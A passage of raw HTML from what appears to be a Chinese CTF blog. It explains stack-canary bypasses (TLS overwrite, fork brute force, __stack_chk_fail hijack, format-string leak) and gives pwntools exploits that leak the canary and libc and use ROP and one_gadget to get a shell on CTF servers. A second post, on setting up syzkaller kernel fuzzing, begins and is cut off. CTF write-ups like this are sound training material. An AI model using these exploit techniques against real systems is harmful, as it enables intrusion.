title="0x02"></a>0x02</h3><h3 id="修改canary"><a href="#修改canary" class="headerlink" title="修改canary"></a>修改canary</h3><p>由于多线程中Canary存入TLS结构体，而TLS位于多线程内部栈的高地址，并且该结构体与当前栈差距不足一个page，导致我们能对其进行修改，改为我们想要的值，从而绕过检测。</p><p>这种操作一般在多线程下进行，而且溢出的字节必须足够大才能溢出到tls的位置从而修改canary<br> 题目详见：<a href="https://www.jianshu.com/p/110f715c210f%E4%B8%AD%E7%9A%84babystack">https://www.jianshu.com/p/110f715c210f中的babystack</a></p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><h3 id="爆破canary"><a href="#爆破canary" class="headerlink" title="爆破canary"></a>爆破canary</h3><p>Canary在设计中存在一个缺陷，这个缺陷或许不是由于Canary的设计问题，而是linux的机制导致的，那就是子进程会继承父进程的Canary，每一次fork的进程内存布局与父进程一致，Canary值也相同</p><p>这样当我们子进程由于Canary判断不正确导致程序crash后，父进程不会Crash<br> 我们就完全可以利用这样的特点，彻底逐个字节将Canary爆破出来，爆破模板如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Brute forcing stack canary &quot;</span><br><br>start = <span class="hljs-built_in">len</span>(p)<br>stop = <span class="hljs-built_in">len</span>(p)+<span class="hljs-number">8</span><br><br>while <span class="hljs-built_in">len</span>(p) &lt; stop:<br>   <span class="hljs-keyword">for</span> i in xrange(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<br>      res = send2server(p + chr(i))<br><br>      <span class="hljs-keyword">if</span> res != <span class="hljs-string">&quot;&quot;</span>:<br>         p = p + chr(i)<br>         #<span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\t[+] Byte found 0x%02x&quot;</span> % i<br>         <span class="hljs-keyword">break</span><br><br>      <span class="hljs-keyword">if</span> i == <span class="hljs-number">255</span>:<br>         <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-] Exploit failed&quot;</span><br>         sys.exit(<span class="hljs-number">-1</span>)<br><br><br>canary = p[stop:start<span class="hljs-number">-1</span>:<span class="hljs-number">-1</span>].encode(<span class="hljs-string">&quot;hex&quot;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;   [+] SSP value is 0x%s&quot;</span> % canary<br></code></pre></td></tr></table></figure><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><h3 id="绕过canary"><a href="#绕过canary" class="headerlink" title="绕过canary"></a>绕过canary</h3><p>这种操作的核心思想就是想办法让他不执行canary的报错或者直接跳过canary的检查</p><ul><li>1.利用格式化字符串或者数组下标越界，可以栈地址任意读写，不必连续向栈上写，直接写ebp和ret因此不会触发Canary检查。</li><li>2.Hijack __stack_chk_fail<br> 当Canary验证失败的时候是进入到stack_chk_failed函数中，它在该函数中完成报错输出，但是如果我们能够劫持该函数，让它不在完成该功能，那么Canary就形同虚设，我们就可以为所欲为栈溢出了<br> 但需要注意的是：这种技术并不是我们一般方式的Hijack GOT表，一般我们HijackGOT是GOT表绑定了真实地址之后，我们修改它，让程序执行其他的函数。 Got表中要绑定真实地址必须是得执行过一次，然而stack_chk_failed执行第一次的时候程序就报错退出了，因此我们需要Overwrite的尚未执行过的stack_chk_failed的GOT表项，此时GOT表中应该存贮这stack_chk_failed PLT[1]的地址</li><li><ol><li>通过一些其他的机制跳过canary的检查，比如Shanghai-DCTF-2017 线下攻防Pwn题 中：–利用c++异常机制绕过canary检查</li></ol></li></ul><p>通过格式化字符串泄露canary,这个程序是64位程序，写入参数的时，是先存入六个寄存器中的，故参数偏移为6+0x88/8=6+17=23.</p><p>EXP:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#!usr/bin/python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">io</span> = remote(&#x27;<span class="hljs-number">111.198.29.45</span>&#x27;,<span class="hljs-number">58555</span>)<br><span class="hljs-attribute">cat_flag</span>=<span class="hljs-number">0</span>x<span class="hljs-number">4008</span>DA<br><span class="hljs-attribute">io</span>.sendlineafter(<span class="hljs-string">&quot;battle&quot;</span>,str(<span class="hljs-number">2</span>))<br><span class="hljs-attribute">sleep</span>(<span class="hljs-number">0</span>.<span class="hljs-number">2</span>)<br><span class="hljs-attribute">io</span>.sendline(<span class="hljs-string">&quot;%23$p&quot;</span>)<br><span class="hljs-attribute">sleep</span>(<span class="hljs-number">0</span>.<span class="hljs-number">2</span>)<br><span class="hljs-attribute">io</span>.recvuntil(&#x27;<span class="hljs-number">0</span>x&#x27;)<br><span class="hljs-attribute">canary</span>=int(io.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br><span class="hljs-attribute">io</span>.sendlineafter(<span class="hljs-string">&quot;battle&quot;</span>,str(<span class="hljs-number">1</span>))<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0</span>x<span class="hljs-number">88</span>+p<span class="hljs-number">64</span>(canary)+p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>)+p<span class="hljs-number">64</span>(cat_flag)<br><span class="hljs-attribute">io</span>.sendline(payload)<br><span class="hljs-attribute">io</span>.interactive()<br></code></pre></td></tr></table></figure><h2 id="monkey–-XCTF-3rd-BCTF-2017"><a href="#monkey–-XCTF-3rd-BCTF-2017" class="headerlink" title="monkey– XCTF 3rd-BCTF-2017"></a>monkey– XCTF 3rd-BCTF-2017</h2><p>题目给的是一个js shell,在ida中找到os.system,试一下</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs vim">➤ nc <span class="hljs-number">111.198</span>.<span class="hljs-number">29.45</span> <span class="hljs-number">51022</span><br>js&gt; os.<span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br>os.<span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br><span class="hljs-keyword">ls</span><br>bin<br>dev<br>flag<br>js<br>lib<br>lib32<br>lib64<br>libnspr4.<span class="hljs-keyword">so</span><br>libplc4.<span class="hljs-keyword">so</span><br>libplds4.<span class="hljs-keyword">so</span><br>run.<span class="hljs-keyword">sh</span><br><span class="hljs-keyword">cat</span> flag<br>cyberpeace&#123;<span class="hljs-number">413</span>b97dd2d9e00d68d9a2caca0d25591&#125;<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">js</span>&gt; os.system(<span class="hljs-string">&quot;ls&quot;</span>)<br><span class="hljs-attribute">os</span>.system(<span class="hljs-string">&quot;ls&quot;</span>)<br><span class="hljs-attribute">bin</span><br><span class="hljs-attribute">dev</span><br><span class="hljs-attribute">flag</span><br><span class="hljs-attribute">js</span><br><span class="hljs-attribute">lib</span><br><span class="hljs-attribute">lib32</span><br><span class="hljs-attribute">lib64</span><br><span class="hljs-attribute">libnspr4</span>.so<br><span class="hljs-attribute">libplc4</span>.so<br><span class="hljs-attribute">libplds4</span>.so<br><span class="hljs-attribute">run</span>.sh<br><span class="hljs-attribute">js</span>&gt; os.system(<span class="hljs-string">&quot;cat flag&quot;</span>)<br><span class="hljs-attribute">os</span>.system(<span class="hljs-string">&quot;cat flag&quot;</span>)<br><span class="hljs-attribute">cyberpeace</span>&#123;<span class="hljs-number">413</span>b<span class="hljs-number">97</span>dd<span class="hljs-number">2</span>d<span class="hljs-number">9</span>e<span class="hljs-number">00</span>d<span class="hljs-number">68</span>d<span class="hljs-number">9</span>a<span class="hljs-number">2</span>caca<span class="hljs-number">0</span>d<span class="hljs-number">25591</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><pre><code>Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x400000)</code></pre><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig">➤ <span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> <span class="hljs-string">babystack</span>  <span class="hljs-built_in">--only</span> <span class="hljs-string">&#x27;pop|ret&#x27;</span> | <span class="hljs-string">grep</span> <span class="hljs-string">&#x27;rdi&#x27;</span><br><span class="hljs-string">0x0000000000400a93</span> : <span class="hljs-string">pop</span> <span class="hljs-string">rdi</span> ; <span class="hljs-string">ret</span><br></code></pre></td></tr></table></figure><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function">int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [rsp+10h] [rbp-90h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+98h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">setvbuf</span>(stdin, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">setvbuf</span>(stderr, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>uLL);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-built_in">sub_4008B9</span>();<br>    v3 = <span class="hljs-built_in">sub_400841</span>();<br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> ( v3 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">puts</span>(&amp;s);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;s, <span class="hljs-number">0x100</span>uLL);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">sub_400826</span>(<span class="hljs-string">&quot;invalid choice&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-built_in">sub_400826</span>((<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)&amp;unk_400AE7);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Stack of main:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stata">-0000000000000090 s               <span class="hljs-keyword">db</span> ?<br>-000000000000008F                 <span class="hljs-keyword">db</span> ? ; undefined<br>................                                      0x88<br>-0000000000000009                 <span class="hljs-keyword">db</span> ? ; undefined<br>______________________________________________________<br>-0000000000000008 var_8           dq ?    <span class="hljs-comment">//canary,共8字节，第一个字节是&#x27;\x00&#x27;,其余随机</span><br>+0000000000000000  s              <span class="hljs-keyword">db</span> 8 dup(?)    <span class="hljs-comment">//saved rbp</span><br>+0000000000000008  r              <span class="hljs-keyword">db</span> 8 dup(?)    <span class="hljs-comment">//ret</span><br>+0000000000000010<br>+0000000000000010 ; end of <span class="hljs-keyword">stack</span> variables<br>There may be <span class="hljs-keyword">two</span> special fields <span class="hljs-keyword">in</span> this <span class="hljs-keyword">window</span>: <span class="hljs-string">&quot; r&quot;</span> and <span class="hljs-string">&quot; s&quot;</span>. They represent the size of the function <span class="hljs-keyword">return</span> address and of the saved registers <span class="hljs-keyword">in</span> bytes.<br></code></pre></td></tr></table></figure><p>试了一下可以用one_gadget</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"> one_gadget libc-<span class="hljs-number">2.23</span><span class="hljs-number">.</span>so <br><span class="hljs-number">0x45216</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x30</span>, environ)<br><span class="hljs-symbol">constraints:</span><br>  <span class="hljs-built_in">rax</span> == NULL<br><br><span class="hljs-number">0x4526a</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x30</span>, environ)<br><span class="hljs-symbol">constraints:</span><br>  [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x30</span>] == NULL<br><br><span class="hljs-number">0xf0274</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x50</span>, environ)<br><span class="hljs-symbol">constraints:</span><br>  [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x50</span>] == NULL<br><br><span class="hljs-number">0xf1117</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x70</span>, environ)<br><span class="hljs-symbol">constraints:</span><br>  [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x70</span>] == NULL<br></code></pre></td></tr></table></figure><p>注意：</p><p>①canary为防止泄露，第一位已知为’\x00’<br>②puts()函数输出时，遇到’\x00’才停止，即使字符串中存在’\n’,也会继续输出<br>③read函数在读取长度限制内，能够把’\n’也读进字符串中 </p><p>思路：</p><p>1.借puts输出canary.</p><p>2.通过puts泄露puts真实地址，得到libc与程序在内存中的偏移libc_base</p><p>3.借助one_gadget得到 execve(“/bin/sh”) </p><p>EXP:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#!usr/bin/python</span><br><span class="hljs-attribute">from</span> pwn import *<br><br><span class="hljs-attribute">io</span> = remote(&#x27;<span class="hljs-number">111.198.29.45</span>&#x27;, <span class="hljs-number">32987</span>)<br><br><span class="hljs-comment"># io = process(&#x27;./babystack&#x27;)</span><br><br><span class="hljs-attribute">elf</span> = ELF(&#x27;./babystack&#x27;)<br><span class="hljs-attribute">libc</span> = ELF(&#x27;./libc-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so&#x27;)<br><br><span class="hljs-attribute">rdi_ret</span> = <span class="hljs-number">0</span>x<span class="hljs-number">0000000000400</span>a<span class="hljs-number">93</span>        #pop rdi ; ret<br><span class="hljs-attribute">start_addr</span> = <span class="hljs-number">0</span>x<span class="hljs-number">0000000000400720</span><br><span class="hljs-attribute">puts_got</span> = elf.got[&#x27;puts&#x27;]<br><span class="hljs-attribute">puts_plt</span> = elf.plt[&#x27;puts&#x27;]<br><span class="hljs-attribute">one_gadget</span> = <span class="hljs-number">0</span>x<span class="hljs-number">45216</span><br><br><span class="hljs-attribute">success</span>(<span class="hljs-string">&quot;========leak canary========&quot;</span>)<br><span class="hljs-attribute">io</span>.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>, str(<span class="hljs-number">1</span>))<br><span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0</span>x<span class="hljs-number">88</span><br><span class="hljs-attribute">io</span>.sendline(payload)<br><span class="hljs-attribute">io</span>.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>, str(<span class="hljs-number">2</span>))<br><span class="hljs-attribute">io</span>.recvuntil(<span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0</span>x<span class="hljs-number">88</span> + &#x27;\n&#x27;)<br><span class="hljs-attribute">canary</span> = u<span class="hljs-number">64</span>(io.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>, &#x27;\x<span class="hljs-number">00</span>&#x27;))<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;canary=&gt;&quot;</span> +hex(canary))<br><br><span class="hljs-attribute">success</span>(<span class="hljs-string">&quot;========leak libc_base========&quot;</span>)<br><span class="hljs-attribute">io</span>.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>, str(<span class="hljs-number">1</span>))<br><span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0</span>x<span class="hljs-number">88</span> + p<span class="hljs-number">64</span>(canary) + p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>) + p<span class="hljs-number">64</span>(rdi_ret) + p<span class="hljs-number">64</span>(puts_got) + p<span class="hljs-number">64</span>(puts_plt) + p<span class="hljs-number">64</span>(start_addr)#   puts(puts)<br><span class="hljs-attribute">io</span>.sendline(payload)<br><span class="hljs-attribute">io</span>.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>, str(<span class="hljs-number">3</span>))<br><br><span class="hljs-attribute">puts_addr</span> = u<span class="hljs-number">64</span>(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, &#x27;\x<span class="hljs-number">00</span>&#x27;))<br><span class="hljs-attribute">print</span> (<span class="hljs-string">&quot;puts_addr=&gt;&quot;</span> +hex(puts_addr))<br><span class="hljs-attribute">libc_base</span> = puts_addr - libc.symbols[&#x27;puts&#x27;]<br><span class="hljs-attribute">one_gadget</span> = libc_base + one_gadget<br><br><span class="hljs-attribute">success</span>(<span class="hljs-string">&quot;========get shell========&quot;</span>)<br><span class="hljs-attribute">io</span>.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>, str(<span class="hljs-number">1</span>))<br><span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0</span>x<span class="hljs-number">88</span> + p<span class="hljs-number">64</span>(canary) + p<span class="hljs-number">64</span>(<span class="hljs-number">64</span>) + p<span class="hljs-number">64</span>(one_gadget) <br><span class="hljs-attribute">io</span>.sendline(payload)<br><span class="hljs-attribute">io</span>.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>, str(<span class="hljs-number">3</span>))<br><br><br><span class="hljs-attribute">io</span>.interactive()<br></code></pre></td></tr></table></figure><p>用system(“/bin/sh”),出现了小差错，无法解答</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[+]</span> ========<span class="hljs-keyword">get</span> shell========<br><span class="hljs-string">[*]</span> Switching to <span class="hljs-built_in">int</span>eractive mode<br>sh: <span class="hljs-number">1</span>: d: <span class="hljs-keyword">not</span> found<br><span class="hljs-string">[*]</span> Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> <span class="hljs-built_in">int</span>eractive<br></code></pre></td></tr></table></figure><p>而本地却可以get shell,很神奇……</p><h2 id="time-formatter"><a href="#time-formatter" class="headerlink" title="time_formatter"></a>time_formatter</h2><pre><code>Arch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x400000)FORTIFY:  Enabled</code></pre><p>基本功能：</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dos">➤ ./time_formatter <br>Welcome to Mary&#x27;s Unix <span class="hljs-built_in">Time</span> Formatter!<br><span class="hljs-number">1</span>) <span class="hljs-built_in">Set</span> a <span class="hljs-built_in">time</span> <span class="hljs-built_in">format</span>.<br><span class="hljs-number">2</span>) <span class="hljs-built_in">Set</span> a <span class="hljs-built_in">time</span>.<br><span class="hljs-number">3</span>) <span class="hljs-built_in">Set</span> a <span class="hljs-built_in">time</span> zone.<br><span class="hljs-number">4</span>) <span class="hljs-built_in">Print</span> your <span class="hljs-built_in">time</span>.<br><span class="hljs-number">5</span>) <span class="hljs-keyword">Exit</span>.<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Fuzzing linux kernel with syzkaller</title>
    <link href="/2022/02/20/syzkaller-fuzzing/"/>
    <url>/2022/02/20/syzkaller-fuzzing/</url>
    
    <content type="html"><![CDATA[<h2 id="安装基本软件"><a href="#安装基本软件" class="headerlink" title="安装基本软件"></a>安装基本软件</h2><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs q"><br>sudo apt-<span class="hljs-built_in">get</span> install debootstrap<br>sudo apt install qemu-kvm<br>sudo apt-<span class="hljs-built_in">get</span> install subversion<br>sudo apt-<span class="hljs-built_in">get</span> install git<br>sudo apt-<span class="hljs-built_in">get</span> install make<br>sudo apt-<span class="hljs-built_in">get</span> install qemu<br>sudo apt install libssl-<span class="hljs-built_in">dev</span> libelf-<span class="hljs-built_in">dev</span><br>sudo apt-<span class="hljs-built_in">get</span> install flex bison libc6-<span class="hljs-built_in">dev</span> libc6-<span class="hljs-built_in">dev</span>-i386 linux-libc-<span class="hljs-built_in">dev</span> linux-libc-<span class="hljs-built_in">dev</span>:i386 libgmp3-<span class="hljs-built_in">dev</span> libmpfr-<span class="hljs-built_in">dev</span> libmpc-<span class="hljs-built_in">dev</span><br>sudo apt-<span class="hljs-built_in">get</span> install g++<br>sudo apt-<span class="hljs-built_in">get</span> install build-essential<br>sudo apt install gcc<br>sudo apt install openssh-server<br></code></pre></td></tr></table></figure><p>安装go编程语言并没有使用apt install golang-go，使用apt安装的go编程语言版本为1.10，使用这个版本的go会在编译syzkaller时报错，所以在这选择下载安装1.17版本的go</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://dl.google.com/go/go1.17.6.linux-amd64.tar.gz<br>tar -zxvf go1.17.6.linux-amd64.tar.gz <br><span class="hljs-built_in">export</span> GOPATH=/home/<span class="hljs-built_in">test</span>/git/go/go //路径替换为自己虚拟机中的路径<br><span class="hljs-built_in">export</span> GOROOT=/home/<span class="hljs-built_in">test</span>/git/go/go<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$GOPATH</span>/bin:<span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$GOROOT</span>/bin:<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure><p>运行go命令可以执行，即为安装成功。</p><h2 id="编译syzkaller"><a href="#编译syzkaller" class="headerlink" title="编译syzkaller"></a>编译syzkaller</h2><p>使用下面的命令拉取编译syzkaller代码。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/google/</span>syzkaller.git<br>cd syzkaller<br>make <br></code></pre></td></tr></table></figure><p>报错</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">cerises<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~/Desktop/syzkaller</span><span class="hljs-variable">$ </span>make<br><br><br><span class="hljs-symbol">go:</span> cloud.google.com/go<span class="hljs-variable">@v0</span>.<span class="hljs-number">81.0</span>: Get <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/proxy.golang.org/cloud</span>.google.com/go/<span class="hljs-variable">@v</span>/<span class="hljs-symbol">v0.81.0.mod:</span> dial tcp <span class="hljs-number">172.217</span>.<span class="hljs-number">163.49</span><span class="hljs-symbol">:</span><span class="hljs-number">443</span>: i/o timeout<br><span class="hljs-symbol">Makefile:</span><span class="hljs-number">39</span>: *** syz-make failed.  Stop.<br></code></pre></td></tr></table></figure><p>把 Go 模块代理更换成Goproxy.cn 就解决了</p><p><strong>用法</strong></p><p><strong>Go 1.13 及以上（推荐）</strong></p><p>打开你的终端并执行</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">$ <span class="hljs-keyword">go</span> env -<span class="hljs-keyword">w</span> GO111MODULE=<span class="hljs-keyword">on</span><br>$ <span class="hljs-keyword">go</span> env -<span class="hljs-keyword">w</span> GOPROXY=http<span class="hljs-variable">s:</span>//goproxy.<span class="hljs-keyword">cn</span>,direct<br></code></pre></td></tr></table></figure><p>完成。</p><p><strong>macOS 或 Linux</strong></p><p>打开你的终端并执行</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ <span class="hljs-builtin-name">export</span> <span class="hljs-attribute">GO111MODULE</span>=on<br>$ <span class="hljs-builtin-name">export</span> <span class="hljs-attribute">GOPROXY</span>=https://goproxy.cn<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight 